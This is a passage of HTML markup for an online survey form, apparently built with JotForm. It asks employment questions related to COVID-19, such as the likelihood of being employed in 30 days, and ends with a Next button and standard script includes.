              <input type="radio" class="form-radio" id="input_23_3" name="If last response was NO, what was your main reason for not working for pay?" value="I was not at my usual jobs because I was recovering from COVID-19 or isolating due to exposure to COVID-19" />
              <label id="label_input_23_3" for="input_23_3"> I was not at my usual jobs because I was recovering from COVID-19 or isolating due to exposure to COVID-19 </label>
            </span>
          </div>
        </div>
      </li>
      <li class="form-line" data-type="control_radio" id="id_24">
        <label class="form-label form-label-top form-label-auto" id="label_24" for="input_24"> Think about 30 days from now, how likely do you think it is that you will be employed at that time? <font style="color:red">*</font> </label>
        <div id="cid_24" class="form-input-wide" data-layout="full">
          <div class="form-single-column" role="group" aria-labelledby="label_24" data-component="radio">
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <br><input type="radio" class="form-radio" id="input_24_0" name="Think about 30 days from now, how likely do you think it is that you will be employed at that time?" value="Extremely likely" />
              <label id="label_input_24_0" for="input_24_0"> Extremely likely </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_24_1" name="Think about 30 days from now, how likely do you think it is that you will be employed at that time?" value="Very likely" />
              <label id="label_input_24_1" for="input_24_1"> Very likely </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_24_2" name="Think about 30 days from now, how likely do you think it is that you will be employed at that time?" value="Moderately likely" />
              <label id="label_input_24_2" for="input_24_2"> Moderately likely </label>
            </span>
            <span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_24_3" name="Think about 30 days from now, how likely do you think it is that you will be employed at that time?" value="Not too likely" />
              <label id="label_input_24_3" for="input_24_3"> Not too likely </label>
            </span>
			<span class="form-radio-item" style="clear:left">
              <span class="dragger-item">
              </span>
              <input type="radio" class="form-radio" id="input_24_4" name="Think about 30 days from now, how likely do you think it is that you will be employed at that time?" value="Unlikely" />
              <label id="label_input_24_4" for="input_24_4"> Unlikely </label>
            </span>
          </div>
        </div>
      </li>
      <li class="form-line" data-type="control_button" id="id_25">
        <div id="cid_25" class="form-input-wide" data-layout="full">
          <div data-align="left" class="form-buttons-wrapper form-buttons-left   jsTest-button-wrapperField">
            <button id="input_25" type="submit" class="  custom-button" data-component="button" data-content="">
              Next
            </button>
          </div>
        </div>
      </li>
	  <img src="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/gigs/129994299/original/fb6edd112ce0be24ca178140aa0327316984f400/create-a-google-form-about-anything-you-want.png" alt="Form" style="width:250px;height:100px; display: block;margin-left: auto;margin-right: auto;">

    </ul>
  </div>
</html>
<script src="https://cdn.jotfor.ms//js/vendor/smoothscroll.min.js?v=3.3.22120"></script>
<script src="https://cdn.jotfor.ms//js/errorNavigation.js?v=3.3.22120"></script>
